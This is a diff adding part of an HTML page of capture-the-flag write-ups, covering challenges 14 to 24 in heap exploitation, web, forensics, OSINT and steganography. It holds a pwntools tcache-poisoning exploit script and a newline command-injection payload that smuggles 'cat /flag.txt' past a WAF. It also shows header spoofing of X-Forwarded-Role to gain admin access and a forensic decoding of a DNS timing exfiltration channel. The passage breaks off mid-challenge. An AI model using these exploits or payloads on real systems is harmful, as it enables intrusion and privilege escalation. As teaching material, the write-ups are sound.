+        m = re.search(rb"Created note (\d+) at (0x[0-9a-fA-F]+)", r)
+        return int(m.group(1)), int(m.group(2), 16)
+
+    def edit(self, index, content):
+        self.io.sendline(b"2"); self.io.recvuntil(b"Index: ")
+        self.io.sendline(str(index).encode()); self.io.recvuntil(b"Append content: ")
+        self.io.send(content + b"\n"); self._wait_prompt()
+
+    def delete(self, index):
+        self.io.sendline(b"3"); self.io.recvuntil(b"Index: ")
+        self.io.sendline(str(index).encode()); self._wait_prompt()
+
+    def print_note(self, index):
+        self.io.sendline(b"4"); self.io.recvuntil(b"Index: ")
+        self.io.sendline(str(index).encode()); return self.io.recvall(timeout=1)
+
+def make_poison(target, freed_chunk):
+    enc = target ^ (freed_chunk >> 12)
+    return b"P" * OVERWRITE_AT + p64(enc) + b"Q" * (NOTE_LEN - OVERWRITE_AT - 8)
+
+def run(host, port):
+    c = NotesClient(host, port)
+    n0, _      = c.create(NOTE_LEN, b"A" * (NOTE_LEN - 1))
+    n1, n1_addr = c.create(NOTE_LEN, b"B")
+    n2, _      = c.create(NOTE_LEN, b"C")
+    c.delete(n2); c.delete(n1)
+    c.edit(n0, make_poison(c.hook_addr, n1_addr))
+    c.create(NOTE_LEN, b"D")
+    c.create(NOTE_LEN, p64(c.win_addr))
+    found = re.search(FLAG_PATTERN, c.print_note(0))
+    return found.group(0).decode()
+
+if __name__ == "__main__":
+    context.log_level = "info"
+    print(run(HOST_DEFAULT, PORT_DEFAULT))</pre>
+    </div>
+  </div>
+
+  <div class="flag-box">
+    <div class="flag-icon">🚩</div>
+    <div>
+      <div class="flag-label">Flag</div>
+      <div class="flag-value">Extracted via tcache poisoning → hook overwrite → win()</div>
+    </div>
+  </div>
+</div>
+
+<div class="divider"></div>
+
+<!-- 15. Ping Tool -->
+<div class="challenge" id="ch15">
+  <div class="challenge-header">
+    <span class="challenge-num web">15</span>
+    <div class="challenge-title-wrap">
+      <h2>Ping Tool</h2>
+      <div class="tags">
+        <span class="tag web">Web</span>
+        <span class="tag web">Command Injection</span>
+        <span class="tag web">WAF Bypass</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="summary-box">
+    A web-based ping utility that accepts an <code>ip</code> parameter and passes it to a shell command like <code>ping -c 4 &lt;ip&gt;</code>. A WAF blocks common shell metacharacters (<code>;</code>, <code>&amp;&amp;</code>, <code>|</code>) but misses the newline character (<code>\n</code>), which most shells treat as a command terminator.
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 01</span><h3>Reconnaissance</h3></div>
+    <p>The challenge domain resolved to a backend IP address:</p>
+    <div class="code-block">
+      <div class="code-lang">bash</div>
+      <pre>getent hosts chall-87b26a01.evt-246.glabs.ctf7.com
+# → 212.2.250.33</pre>
+    </div>
+    <p>Requests were sent directly to the IP while preserving the original hostname with the <code>Host</code> header — useful when a service relies on proxy routing that depends on the hostname.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 02</span><h3>Vulnerability Analysis</h3></div>
+    <p>The target likely performs input handling like:</p>
+    <div class="code-block">
+      <div class="code-lang">shell</div>
+      <pre>ping -c 4 &lt;user_input&gt;</pre>
+    </div>
+    <p>The WAF blocked common shell metacharacters (<code>;</code>, <code>&amp;&amp;</code>, <code>|</code>) but critically missed the <strong>newline character</strong> (<code>\n</code>). In shell contexts, a newline is treated like a command terminator, meaning an attacker can inject a second command by adding a line break to the input.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 03</span><h3>Exploitation</h3></div>
+    <p>The final payload used newline injection to append a command after the expected ping input:</p>
+    <div class="code-block">
+      <div class="code-lang">bash</div>
+      <pre>curl -H 'Host: chall-87b26a01.evt-246.glabs.ctf7.com' \
+     -X POST http://212.2.250.33/ping \
+     --data-urlencode $'ip=127.0.0.1\ncat /flag.txt'</pre>
+    </div>
+    <p>The backend interpreted the input as two separate commands:</p>
+    <div class="code-block">
+      <div class="code-lang">shell — interpreted</div>
+      <pre>ping -c 4 127.0.0.1
+cat /flag.txt</pre>
+    </div>
+    <p>The first line executed normally; the second executed the injected command and printed the flag.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">ROOT CAUSE</span><h3>Why the WAF Failed</h3></div>
+    <table class="info-table">
+      <tr><th>Layer</th><th>Assumption</th><th>Reality</th></tr>
+      <tr><td>WAF</td><td>Blocking dangerous characters is enough</td><td>Newline was not blocked</td></tr>
+      <tr><td>Backend</td><td>User input is safe enough for shell execution</td><td>Raw shell execution was still happening</td></tr>
+      <tr><td>Routing</td><td>Domain-level protections are sufficient</td><td>Direct IP + Host header preserved access</td></tr>
+    </table>
+  </div>
+
+  <div class="flag-box">
+    <div class="flag-icon">🚩</div>
+    <div>
+      <div class="flag-label">Flag</div>
+      <div class="flag-value">Obtained via newline-injected cat /flag.txt</div>
+    </div>
+  </div>
+</div>
+
+<div class="divider"></div>
+
+<!-- 16. API Gateway -->
+<div class="challenge" id="ch16">
+  <div class="challenge-header">
+    <span class="challenge-num web">16</span>
+    <div class="challenge-title-wrap">
+      <h2>API Gateway</h2>
+      <div class="tags">
+        <span class="tag web">Web</span>
+        <span class="tag web">Header Injection</span>
+        <span class="tag web">Proxy Misconfiguration</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="summary-box">
+    A simple API gateway with login, profile, and admin endpoints. The HTML documentation reveals that <code>X-Forwarded-Role</code> is set by nginx for internal routing, and admin access is controlled by the reverse proxy layer — a classic header trust misconfiguration.
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 01</span><h3>Reconnaissance</h3></div>
+    <p>The HTML documentation revealed the following endpoint structure:</p>
+    <div class="code-block">
+      <div class="code-lang">endpoints</div>
+      <pre>GET  /          — documentation page
+POST /api/login — returns a bearer token
+GET  /api/profile       — authenticated user profile
+GET  /api/admin/flag    — admin-only flag endpoint</pre>
+    </div>
+    <p>The admin endpoint explicitly mentioned <code>X-Forwarded-Role</code>, nginx reverse proxy, and role injection — meaning the backend trusts a header that should only be set internally.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 02</span><h3>Initial Attempt</h3></div>
+    <p>A direct request to the admin endpoint with the spoofed header was sent:</p>
+    <div class="code-block">
+      <div class="code-lang">http</div>
+      <pre>GET /api/admin/flag HTTP/1.1
+Host: chall-cdf571c0.evt-246.glabs.ctf7.com
+X-Forwarded-Role: admin</pre>
+    </div>
+    <div class="response-block">
+      <div class="code-lang">json — response</div>
+      <pre>{
+  "message": "Access denied. Admin role required.",
+  "status":  "error",
+  "your_role": "none"
+}</pre>
+    </div>
+    <p>Simply adding the header in the raw curl form was not enough.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 03</span><h3>Exploitation via Burp Suite</h3></div>
+    <p>Using Burp Suite Repeater to send the full request with a complete browser-like header set:</p>
+    <div class="code-block">
+      <div class="code-lang">http</div>
+      <pre>GET /api/admin/flag HTTP/1.1
+Host: chall-cdf571c0.evt-246.glabs.ctf7.com
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+X-Forwarded-Role: admin
+User-Agent: Mozilla/5.0 ...
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive</pre>
+    </div>
+    <div class="response-block">
+      <div class="code-lang">json — response</div>
+      <pre>{
+  "flag":    "ctf7{API_fate_way_beb058e2}",
+  "message": "Welcome, administrator",
+  "status":  "success"
+}</pre>
+    </div>
+  </div>
+
+  <div class="explanation">
+    The application trusted <code>X-Forwarded-Role</code> as a proxy-controlled header for authorization. Because the backend did not strictly validate that the header truly came from the reverse proxy, any client could supply it manually and escalate privileges. This is a classic <strong>reverse proxy misconfiguration / header trust issue</strong>.
+  </div>
+
+  <div class="flag-box">
+    <div class="flag-icon">🚩</div>
+    <div>
+      <div class="flag-label">Flag</div>
+      <div class="flag-value">ctf7{API_fate_way_beb058e2}</div>
+    </div>
+  </div>
+</div>
+
+<div class="divider"></div>
+
+<!-- 17. The Third Path -->
+<div class="challenge" id="ch17">
+  <div class="challenge-header">
+    <span class="challenge-num forensics">17</span>
+    <div class="challenge-title-wrap">
+      <h2>The Third Path</h2>
+      <div class="tags">
+        <span class="tag forensics">Forensics</span>
+        <span class="tag forensics">Memory Dump</span>
+        <span class="tag forensics">Covert Channel</span>
+        <span class="tag forensics">Timing Analysis</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="summary-box">
+    Two files: <code>memory.dmp</code> (2 MB memory dump from a compromised workstation) and <code>capture.pcap</code> (network traffic captured during the incident). The goal was to find a hidden "heartbeat bridging the network and RAM." Neither artifact alone is sufficient — both are required.
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 01</span><h3>Assess the PCAP</h3></div>
+    <div class="code-block">
+      <div class="code-lang">python</div>
+      <pre>import dpkt
+with open('capture.pcap', 'rb') as f:
+    pcap = dpkt.pcap.Reader(f)
+    packets = list(pcap)</pre>
+    </div>
+    <p>Findings: 3,004 total packets; 3,002 UDP on port 53→53 (DNS) — suspicious because real DNS doesn't use port 53 as both source and destination. All transaction IDs were <code>0x0000</code>. Only 2 TCP packets: a <code>GET /payload.bin</code> to <code>evil.com</code> and a binary response. These TCP packets were planted noise; the real data was in the UDP timing.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 02</span><h3>Triage the Memory Dump</h3></div>
+    <p>Strings came up mostly empty. An entropy analysis across 1KB chunks was performed:</p>
+    <div class="code-block">
+      <div class="code-lang">python</div>
+      <pre>import math
+from collections import Counter
+
+def entropy(data):
+    c = Counter(data)
+    return -sum((v/len(data)) * math.log2(v/len(data)) for v in c.values())
+
+with open('memory.dmp', 'rb') as f:
+    mem = f.read()
+for i in range(0, len(mem), 1024):
+    e = entropy(mem[i:i+1024])
+    print(f"0x{i:06x}: {e:.2f}")</pre>
+    </div>
+    <p>Nearly every chunk showed entropy ~7.80–7.84 (encrypted/compressed data). Two chunks around offset <code>0x0E2000</code> dropped noticeably to ~7.49–7.50 — warranting a closer look.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 03</span><h3>Extract the Embedded PNG</h3></div>
+    <div class="code-block">
+      <div class="code-lang">python</div>
+      <pre>png_sig = b'\x89PNG\r\n\x1a\n'
+iend    = b'IEND\xaeB`\x82'
+
+pos      = mem.find(png_sig)   # → 0xe2006
+iend_pos = mem.find(iend, pos) # → 0xe35c0
+
+png_data = mem[pos : iend_pos + 8]
+with open('extracted.png', 'wb') as f:
+    f.write(png_data)</pre>
+    </div>
+    <p>The extracted file was a valid 400×100 RGB PNG. Opening it revealed two lines of text on a dark blue background — the decoder specification:</p>
+    <div class="response-block">
+      <div class="code-lang">image text</div>
+      <pre>Missing Data Info:
+ 600x40 1-bit monochrome (8 aligned)</pre>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 04</span><h3>Decode the Timing Channel</h3></div>
+    <p>The PNG described a 600×40 1-bit bitmap: 75 bytes/row × 40 rows = 3,000 bytes. Back in the pcap, inter-packet timing of the 3,002 UDP packets was extracted and quantized to 1/32-second units:</p>
+    <div class="code-block">
+      <div class="code-lang">python</div>
+      <pre>timestamps = []
+for ts, buf in packets:
+    eth = dpkt.ethernet.Ethernet(buf)
+    if isinstance(eth.data.data, dpkt.udp.UDP):
+        timestamps.append(ts)
+
+diffs  = [timestamps[i+1] - timestamps[i] for i in range(len(timestamps)-1)]
+vals32 = [round(d * 32) for d in diffs]</pre>
+    </div>
+    <p>The deviations from a baseline of 259 were exact powers of 2 — the hallmark of byte-level encoding. The formula: <code>byte_value = 259 − val32</code>. The first interval was a sync marker; the next 3,000 intervals encoded 3,000 bytes of bitmap data.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 05</span><h3>Render the Bitmap</h3></div>
+    <div class="code-block">
+      <div class="code-lang">python</div>
+      <pre>from PIL import Image
+
+baseline      = 259
+bitmap_bytes  = [baseline - v for v in vals32[1:3001]]
+width_px, height = 600, 40
+bytes_per_row = 75  # 600 / 8
+
+img = Image.new('L', (width_px, height), 0)
+px  = img.load()
+
+for row in range(height):
+    for col_byte in range(bytes_per_row):
+        byte_val = bitmap_bytes[row * bytes_per_row + col_byte]
+        for bit in range(8):
+            col = col_byte * 8 + bit
+            px[col, row] = ((byte_val >> (7 - bit)) & 1) * 255
+
+img_scaled = img.resize((width_px * 3, height * 10), Image.NEAREST)
+img_scaled.save('flag_bitmap.png')</pre>
+    </div>
+    <p>The rendered bitmap image contained the flag as readable text.</p>
+  </div>
+
+  <div class="explanation">
+    <strong>Covert Channel Architecture:</strong> The malware ran a DNS keepalive loop (~8-second heartbeat) while modulating each interval by fractions of a second to encode one byte of exfiltrated data per packet. The memory dump contained a helper PNG serving as the decoder ring — meaningless without the pcap, and the pcap meaningless without the memory dump. Both artifacts were required.
+  </div>
+
+  <div class="flag-box">
+    <div class="flag-icon">🚩</div>
+    <div>
+      <div class="flag-label">Flag</div>
+      <div class="flag-value">Rendered from 600×40 1-bit bitmap decoded from UDP timing channel</div>
+    </div>
+  </div>
+</div>
+
+<div class="divider"></div>
+
+<!-- 18. Two-Point-ThreeSix -->
+<div class="challenge" id="ch18">
+  <div class="challenge-header">
+    <span class="challenge-num osint">18</span>
+    <div class="challenge-title-wrap">
+      <h2>Two-Point-ThreeSix</h2>
+      <div class="tags">
+        <span class="tag osint">OSINT</span>
+        <span class="tag osint">Audio Analysis</span>
+        <span class="tag osint">Historical Research</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="summary-box">
+    An MP3 recording of a tense conversation between a man and a woman. The challenge asks to determine: the name of the female voice (as identified in public records), the real-world start and end time of the recording in IST, and the date on which the recording took place.<br/>
+    <strong>Flag format:</strong> <code>MythX{JohnDoe_hhmm_hhmm_ddmmyyyy}</code>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 01</span><h3>Initial Analysis</h3></div>
+    <p>The dialogue felt heavy and structured, immediately bringing to mind the intercepted communications from the 2008 Mumbai attacks. <code>exiftool</code> was run on the audio file to extract embedded metadata:</p>
+    <div class="code-block">
+      <div class="code-lang">bash</div>
+      <pre>exiftool recording.mp3</pre>
+    </div>
+    <p>The metadata contained a YouTube link to a news channel video where the recording had been publicly posted. The video included on-screen timestamps and date information, providing the start time, end time, and date of the interception.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 02</span><h3>Cross-referencing Public Records</h3></div>
+    <p>The audio content matched publicly documented intercepted calls from the 26/11 Mumbai attacks on 27 November 2008. The female voice was identified as <strong>Norma</strong> through public records and news documentation of the incident. The YouTube video confirmed the recording ran from <strong>16:50 to 17:01 IST</strong> on <strong>27 November 2008</strong>.</p>
+  </div>
+
+  <div class="flag-box">
+    <div class="flag-icon">🚩</div>
+    <div>
+      <div class="flag-label">Flag</div>
+      <div class="flag-value">MythX{Norma_1650_1701_27112008}</div>
+    </div>
+  </div>
+</div>
+
+<div class="divider"></div>
+
+<!-- 19. Two-Point-ThreeSix Part 2 -->
+<div class="challenge" id="ch19">
+  <div class="challenge-header">
+    <span class="challenge-num osint">19</span>
+    <div class="challenge-title-wrap">
+      <h2>Two-Point-ThreeSix Part 2</h2>
+      <div class="tags">
+        <span class="tag osint">OSINT</span>
+        <span class="tag osint">Historical Research</span>
+        <span class="tag osint">Timeline Reconstruction</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="summary-box">
+    A follow-up to the previous challenge. The task is not to find a name, but to reconstruct a <em>timeline anomaly</em>. The capture of Ajmal Kasab is documented, but there is a discrepancy hidden in plain sight. Find the approximate time (IST) at which the terrorist was captured.<br/>
+    <strong>Flag format:</strong> <code>MythX{HH:MM:AM/PM}</code>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 01</span><h3>Research Approach</h3></div>
+    <p>The challenge explicitly stated this was about a <strong>timeline discrepancy</strong> in an otherwise well-documented event. Standard search results for "Ajmal Kasab capture time" returned conflicting information across sources.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 02</span><h3>Finding the Discrepancy</h3></div>
+    <p>A detailed article by <strong>The Hindu</strong> contained a granular timeline of the Ajmal Kasab trial proceedings. Cross-referencing this against other public sources revealed a discrepancy in the reported capture time. The Hindu's timeline indicated the capture occurred at approximately <strong>01:30 AM IST</strong> — a detail that diverges from commonly cited accounts.</p>
+  </div>
+
+  <div class="flag-box">
+    <div class="flag-icon">🚩</div>
+    <div>
+      <div class="flag-label">Flag</div>
+      <div class="flag-value">Mythx{01:30:AM}</div>
+    </div>
+  </div>
+</div>
+
+
+
+<!-- ─────────────── 20. JS Vault ─────────────── -->
+<div class="divider"></div>
+<div class="challenge" id="ch20">
+  <div class="challenge-header">
+    <span class="challenge-num web">20</span>
+    <div class="challenge-title-wrap">
+      <h2>JS Vault</h2>
+      <div class="tags">
+        <span class="tag web">Web</span>
+        <span class="tag web">Client-Side JS</span>
+        <span class="tag web">Obfuscation</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="summary-box">
+    The <strong>KeyForge Vault</strong> presents itself as a secure client-side vault requiring an access code to reveal a hidden secret. The entire validation logic is implemented in client-side JavaScript (<code>/static/vault.js</code>) — meaning the browser already contains the secret, it's just disguised.
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 01</span><h3>Locate the Logic</h3></div>
+    <p>From the HTML source, the vault references an external script:</p>
+    <div class="code-block">
+      <div class="code-lang">html</div>
+      <pre>&lt;script src="/static/vault.js"&gt;&lt;/script&gt;</pre>
+    </div>
+    <p>Accessing this file directly reveals the full verification mechanism.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 02</span><h3>Analyze the Obfuscated Code</h3></div>
+    <p>Key observations inside <code>vault.js</code>:</p>
+    <div class="code-block">
+      <div class="code-lang">javascript</div>
+      <pre>var _0x4a7b=[99,116,102,55,123,106,115,95,115,101];
+var _0x8f2c=[99,114,101,116,95,101,120,112,111,115];
+var _0x1d9e=[101,100,95,102,49,100,50,57,57,101,102,125];
+
+function _0x3fa1(){
+  var _0xc = _0x4a7b.concat(_0x8f2c).concat(_0x1d9e);
+  return _0xc.map(function(_0xe){
+    return String.fromCharCode(_0xe);
+  }).join('');
+}</pre>
+    </div>
+    <p>Three arrays are concatenated and each value is converted via <code>String.fromCharCode</code> — this function directly constructs the flag.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 03</span><h3>Decode the Flag</h3></div>
+    <p>Each number corresponds to an ASCII character. Concatenating all values in order yields the flag directly. The so-called "access code" hardcoded as <code>var _0xb7a4='ctf7-open-sesame'</code> is irrelevant — it only gates the UI display, not access to the data. The flag is already present in the script.</p>
+    <div class="response-block">
+      <div class="code-lang">output</div>
+      <pre>ctf7{js_secret_exposed_f1d299ef}</pre>
+    </div>
+  </div>
+
+  <div class="explanation">
+    <strong>Client-Side Security is Illusory.</strong> Any logic shipped to the browser is fully visible and controllable. Obfuscation — splitting strings into arrays and encoding them as ASCII values — does not prevent extraction. Instead of brute-forcing input, the correct approach is: inspect source, reconstruct logic, recover embedded data. When facing similar challenges, search for <code>String.fromCharCode</code>, <code>atob</code>, or encoded arrays and rebuild them manually or via the browser console.
+  </div>
+
+  <div class="flag-box">
+    <div class="flag-icon">🚩</div>
+    <div>
+      <div class="flag-label">Flag</div>
+      <div class="flag-value">ctf7{js_secret_exposed_f1d299ef}</div>
+    </div>
+  </div>
+</div>
+
+<!-- ─────────────── 21. Source Dive ─────────────── -->
+<div class="divider"></div>
+<div class="challenge" id="ch21">
+  <div class="challenge-header">
+    <span class="challenge-num web">21</span>
+    <div class="challenge-title-wrap">
+      <h2>Source Dive</h2>
+      <div class="tags">
+        <span class="tag web">Web</span>
+        <span class="tag web">Source Map Exposure</span>
+        <span class="tag web">Info Leak</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="summary-box">
+    The target is a cloud platform called <em>NexusCloud</em> with a polished UI and no obvious vulnerabilities. The flag isn't hidden behind logic — it's exposed through careless build practices: a source map file left publicly accessible in production.
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 01</span><h3>Frontend Analysis</h3></div>
+    <p>Viewing the main page source revealed a critical clue:</p>
+    <div class="code-block">
+      <div class="code-lang">html</div>
+      <pre>&lt;script src="/static/app.bundle.js"&gt;&lt;/script&gt;</pre>
+    </div>
+    <p>This indicates a bundled JavaScript file — commonly used in modern web apps built with Webpack or similar tooling.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 02</span><h3>JavaScript Inspection</h3></div>
+    <p>Opening <code>/static/app.bundle.js</code> exposed minified code with the following comment at the end:</p>
+    <div class="code-block">
+      <div class="code-lang">javascript</div>
+      <pre>//# sourceMappingURL=app.bundle.js.map</pre>
+    </div>
+    <p>This is a <strong>source map reference</strong>, typically used during development for debugging. The API docs page reinforced this with the hint: <em>"Source maps are served alongside bundles at their standard location."</em></p>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 03</span><h3>Retrieve the Source Map</h3></div>
+    <p>Directly accessing the source map file:</p>
+    <div class="code-block">
+      <div class="code-lang">url</div>
+      <pre>/static/app.bundle.js.map</pre>
+    </div>
+    <p>This returned a JSON file containing the original source files, unminified code, and developer comments.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 04</span><h3>Analyze Source Content</h3></div>
+    <p>Inside the <code>sourcesContent</code> field, the configuration file revealed a hardcoded secret:</p>
+    <div class="code-block">
+      <div class="code-lang">javascript</div>
+      <pre>const CONFIG = {
+  ...
+  // TODO(@devops): rotate before next release
+  internalDebugToken: "ctf7{breakpoint_found_flag_094122b3}",
+  ...
+};</pre>
+    </div>
+  </div>
+
+  <div class="explanation">
+    This vulnerability stems from a <strong>misconfigured build pipeline</strong>: sensitive data was hardcoded in frontend source, source maps included the full original code, and source maps were publicly accessible in production. Always check for <code>.map</code> files, treat client-side artifacts as potential intel leaks, and look for comments like <code>TODO</code>, <code>debug</code>, or <code>internal</code>. The fix: never embed secrets in frontend code, and disable source maps in production (<code>devtool: false</code> in Webpack).
+  </div>
+
+  <div class="flag-box">
+    <div class="flag-icon">🚩</div>
+    <div>
+      <div class="flag-label">Flag</div>
+      <div class="flag-value">ctf7{breakpoint_found_flag_094122b3}</div>
+    </div>
+  </div>
+</div>
+
+<!-- ─────────────── 22. Redirect Maze ─────────────── -->
+<div class="divider"></div>
+<div class="challenge" id="ch22">
+  <div class="challenge-header">
+    <span class="challenge-num web">22</span>
+    <div class="challenge-title-wrap">
+      <h2>Redirect Maze</h2>
+      <div class="tags">
+        <span class="tag web">Web</span>
+        <span class="tag web">HTTP Headers</span>
+        <span class="tag web">Redirect Chain</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="summary-box">
+    <strong>Warpgate</strong> is an HTTP redirect-based challenge where the flag is not served on any page — it's distributed across multiple <code>302</code> redirect responses as fragments in a custom header. Browsers automatically follow redirects, hiding intermediate responses, which is exactly where the flag fragments live.
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">KEY INSIGHT</span><h3>Custom Header Fragments</h3></div>
+    <p>Each redirect response includes a custom header carrying a fragment of the flag:</p>
+    <div class="code-block">
+      <div class="code-lang">http header</div>
+      <pre>X-Flag-Part: N:&lt;fragment&gt;</pre>
+    </div>
+    <p>Where <code>N</code> is the sequence number and <code>&lt;fragment&gt;</code> is the flag piece. The goal is to capture every redirect response manually and reconstruct the flag in order.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 01</span><h3>Redirect Chain Traversal</h3></div>
+    <p>Instead of using a browser (which auto-follows redirects), <code>curl</code> in verbose mode was used to inspect raw HTTP responses without following them:</p>
+    <div class="code-block">
+      <div class="code-lang">bash</div>
+      <pre>curl -v http://chall-5e5b4c5e.evt-246.glabs.ctf7.com/maze/1</pre>
+    </div>
+    <p>Starting from <code>/maze/1</code>, each request returned a <code>302 Found</code> with a <code>Location</code> and <code>X-Flag-Part</code> header, forming a chain:</p>
+    <div class="code-block">
+      <div class="code-lang">chain</div>
+      <pre>/maze/1 → /maze/2 → /maze/3 → /maze/4 → /maze/5</pre>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 02</span><h3>Automation</h3></div>
+    <p>To extract all flag parts instantly, a loop was used to dump headers from each hop:</p>
+    <div class="code-block">
+      <div class="code-lang">bash</div>
+      <pre>for i in {1..5}; do
+  curl -s -D - http://chall-5e5b4c5e.evt-246.glabs.ctf7.com/maze/$i \
+    -o /dev/null | grep X-Flag-Part
+done</pre>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 03</span><h3>Flag Reconstruction</h3></div>
+    <p>Each header returned a fragment like <code>X-Flag-Part: 1:ctf7{l</code>. The sequence number prefix (<code>N:</code>) was stripped and fragments were concatenated in order to reconstruct the complete flag.</p>
+  </div>
+
+  <div class="explanation">
+    Browsers hide redirect chains — which can conceal critical data. HTTP headers are often used in CTFs for stealth data exfiltration. Tools like <code>curl -v</code> or Python <code>requests</code> with <code>allow_redirects=False</code> are essential for inspecting every hop, not just the destination. This challenge isn't about reaching the destination — it's about <strong>intercepting the journey</strong>.
+  </div>
+
+  <div class="flag-box">
+    <div class="flag-icon">🚩</div>
+    <div>
+      <div class="flag-label">Flag</div>
+      <div class="flag-value">Reconstructed by concatenating X-Flag-Part headers across all redirect hops</div>
+    </div>
+  </div>
+</div>
+
+<!-- ─────────────── 23. Disallowed Path ─────────────── -->
+<div class="divider"></div>
+<div class="challenge" id="ch23">
+  <div class="challenge-header">
+    <span class="challenge-num web">23</span>
+    <div class="challenge-title-wrap">
+      <h2>Disallowed Path</h2>
+      <div class="tags">
+        <span class="tag web">Web</span>
+        <span class="tag web">robots.txt</span>
+        <span class="tag web">Recon</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="summary-box">
+    The challenge name directly hints at the attack vector. The site is <em>CTF7 Sentinel Blog</em>. The <code>robots.txt</code> file, intended to tell crawlers which paths to avoid, inadvertently advertises sensitive internal paths to attackers.
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 01</span><h3>Reading robots.txt</h3></div>
+    <p>Upon visiting the site, <code>robots.txt</code> was accessed directly as the starting point:</p>
+    <div class="code-block">
+      <div class="code-lang">robots.txt</div>
+      <pre>User-agent: *
+Allow: /
+Disallow: /admin
+Disallow: /wp-admin
+Disallow: /tmp
+Disallow: /internal
+Disallow: /api/debug
+
+# Indexing directives
+Sitemap: /sitemap.xml</pre>
+    </div>
+    <p>The <code>Disallow</code> directives list paths that should not be crawled — but in a CTF context, these are exactly the paths worth visiting.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 02</span><h3>Enumerating Disallowed Paths</h3></div>
+    <p>Each disallowed path was visited in turn. The path containing the flag was discovered by probing the restricted routes listed in the file, particularly <code>/internal</code> and <code>/api/debug</code>, which are high-value targets as they suggest internal tooling and debug endpoints respectively.</p>
+  </div>
+
+  <div class="explanation">
+    <code>robots.txt</code> is a <strong>public file</strong> meant for search engine crawlers. Any path listed under <code>Disallow</code> is fully accessible to any HTTP client — the directive is advisory only, not enforced. In real-world assessments and CTFs alike, <code>robots.txt</code> is one of the first reconnaissance targets because developers frequently list sensitive paths there to prevent them from being indexed, unknowingly advertising their existence to attackers.
+  </div>
+
+  <div class="flag-box">
+    <div class="flag-icon">🚩</div>
+    <div>
+      <div class="flag-label">Flag</div>
+      <div class="flag-value">Found by navigating to a Disallow-listed path from robots.txt</div>
+    </div>
+  </div>
+</div>
+
+<!-- ─────────────── 24. Parsing the Unknown ─────────────── -->
+<div class="divider"></div>
+<div class="challenge" id="ch24">
+  <div class="challenge-header">
+    <span class="challenge-num steg">24</span>
+    <div class="challenge-title-wrap">
+      <h2>Parsing the Unknown</h2>
+      <div class="tags">
+        <span class="tag steg">Steganography</span>
+        <span class="tag steg">PNG Chunk</span>
+        <span class="tag steg">XOR Decryption</span>
+        <span class="tag steg">Polyglot</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="summary-box">
+    A PNG image with a fake <code>flag.txt</code> appended at the end as a decoy. The real payload is hidden inside a custom PNG chunk named <code>stEg</code>, XOR-encrypted with key <code>0x42</code>. The challenge description warns directly: <em>"Sometimes what's at the end of the file is just the beginning of the trap."</em>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 01</span><h3>Initial Analysis</h3></div>
+    <p>PNGs are composed of chunks. Attackers can hide data inside custom chunks to create polyglot files or smuggle extra content past basic file carvers. The visible <code>flag.txt</code> at the tail of the file was a red herring designed to mislead automated tools. Instead of trusting the obvious tail data, the file's internal structure was inspected for non-standard chunks.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 02</span><h3>Finding the Hidden Chunk</h3></div>
+    <p>A script was used to scan the PNG binary for the custom chunk type <code>stEg</code>. In the PNG format, a chunk's 4-byte length field immediately precedes the chunk type, making it straightforward to extract:</p>
+    <div class="code-block">
+      <div class="code-lang">python</div>
+      <pre>pos = data.find(b'stEg')
+length = int.from_bytes(data[pos-4:pos], 'big')
+chunk_data = data[pos+4 : pos+4+length]</pre>
+    </div>
+    <p>The extracted bytes were not directly readable as a ZIP archive, indicating the data was encrypted or obfuscated.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 03</span><h3>XOR Decryption</h3></div>
